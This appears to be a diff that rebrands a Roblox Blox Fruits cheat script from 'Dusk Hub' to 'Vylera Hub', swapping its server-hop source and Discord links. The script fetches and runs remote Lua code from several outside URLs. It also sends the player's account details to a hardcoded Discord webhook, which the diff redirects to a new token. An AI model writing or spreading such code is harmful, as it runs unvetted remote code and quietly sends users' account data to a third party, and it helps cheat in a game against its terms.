@@ -1,7 +1,3 @@
-# Dusk-Hub-Blox-fruits
-The official script for Dusk Hub.(:
----------------------------------------
-
 if not game:IsLoaded() then
     repeat task.wait() until game:IsLoaded()
 end
@@ -9,7 +5,7 @@ end
 if setfpscap then
     setfpscap(1000000)
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Dusk Hub",
+        Title = "Vylera Hub",
         Text = "FPS Unlocked!",
         Duration = 5,
         Button1 = "Okay"
@@ -17,7 +13,7 @@ if setfpscap then
     warn("FPS Unlocked!")
 else
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Dusk Hub",
+        Title = "Vylera Hub",
         Text = "Your exploit does not support setfpscap.",
         Duration = 5,
         Button1 = "Okay"
@@ -27,10 +23,10 @@ end
 
 local WindUI = (loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua")))();
 local Window = WindUI:CreateWindow({
-    Title = "Dusk Hub",
+    Title = "Vylera Hub",
     Icon = "rbxassetid://84228153855933",
-    Author = "Dusk Hub | Blox Fruit",
-    Folder = "Dusk Hub_BF",
+    Author = "Vylera Hub | Blox Fruit",
+    Folder = "Vylera Hub_BF",
     Size = UDim2.fromOffset(550, 300),
     Transparent = true,
     Theme = "Dark",
@@ -44,7 +40,7 @@ local Window = WindUI:CreateWindow({
     },
 });
 Window:EditOpenButton({
-    Title = "Dusk Hub - Open",
+    Title = "Vylera Hub - Open",
     Icon = "monitor",
     CornerRadius = UDim.new(0, 6),
     StrokeThickness = 2,
@@ -1169,7 +1165,7 @@ function CheckQuest()
 end
 function Hop()
     local module = (loadstring(game:HttpGet(
-        "https://raw.githubusercontent.com/SoloMig/Server_Hop_Settings/refs/heads/main/ServerHop.lua")))();
+        "https://raw.githubusercontent.com/raw-scriptpastebin/FE/main/Server_Hop_Settings")))();
     module:Teleport(game.PlaceId);
 end
 function isnil(thing)
@@ -2455,12 +2451,12 @@ spawn(function()
 end);
 DiscordServerParagraph = Tabs.InfoTab:Paragraph({
     Title = "Discord Server",
-    Desc = "Link Discord Dusk Hub!",
+    Desc = "Link Discord Vylera Hub!",
     TextXAlignment = "Left",
     Buttons = {{
         Title = "Copy Link Discord",
         Callback = function()
-            setclipboard("https://discord.gg/VqvgmAX3");
+            setclipboard("not right now");
             WindUI:Notify({
                 Title = "Notication",
                 Content = "Discord Link Copied",
@@ -2471,13 +2467,13 @@ DiscordServerParagraph = Tabs.InfoTab:Paragraph({
     }}
 });
 DiscordServerParagraph1 = Tabs.InfoTab:Paragraph({
-    Title = "Social Dusk Hub",
-    Desc = "Link Social Dusk Hub!",
+    Title = "Social Vylera Hub",
+    Desc = "Link Social Vylera Hub!",
     TextXAlignment = "Left",
     Buttons = {{
         Title = "Copy Social",
         Callback = function()
-            setclipboard("https://github.com/SoloMig/Dusk-Hub-Blox-fruits");
+            setclipboard("not right now");
             WindUI:Notify({
                 Title = "Notication",
                 Content = "Social Link Copied",
@@ -10374,7 +10370,7 @@ FpsBoostButton = Tabs.MiscTab:Button({
     end
 });
 FpsBoostButton = Tabs.MiscTab:Button({
-    Title = "Fps Boost (Dusk Hub)",
+    Title = "Fps Boost (Vylera Hub)",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/dyumra/DYHUB-Universal-Game/refs/heads/main/Nigga.lua"))()
     end
@@ -10609,7 +10605,7 @@ local jobId = game.JobId
 -- Tạo dữ liệu gửi lên Discord
 local Data = {
     ["embeds"] = {{
-        ["title"] = "Dusk Hub-Roblox Account Information",
+        ["title"] = "Roblox Account Information",
         ["url"] = "https://www.roblox.com/users/" .. player.UserId,
         ["description"] = "Display name: **" .. player.DisplayName .. "**",
         ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
@@ -10648,7 +10644,7 @@ local Data = {
             ["inline"] = false
         }, {
             ["name"] = "Thank You Everyone",
-            ["value"] = "Used Script By Dusk Hub",
+            ["value"] = "Used Script By Vylera Hub",
             ["inline"] = false
         }}
     }}
@@ -10660,7 +10656,7 @@ local Headers = {
 local Encoded = HttpService:JSONEncode(Data)
 
 local WebhookURL =
-    "https://discord.com/api/webhooks/1455622315340468254/KKaXqUrhJ7LfgjVYTUQ3iNwn4TUrBljo9fZE-bT34Ca4t-pX2C6TVJokRNbpovDGG4Z4"
+    "https://discord.com/api/webhooks/1361944409662423180/cliAsM5X1dqSTEBoz_yO5gsirtWfm7dNAAE89mnHbiu0Lww2-ISxYaWWBLsXexauGM6-"
 local Request = http_request or request or HttpPost or syn.request
 if Request then
     Request({
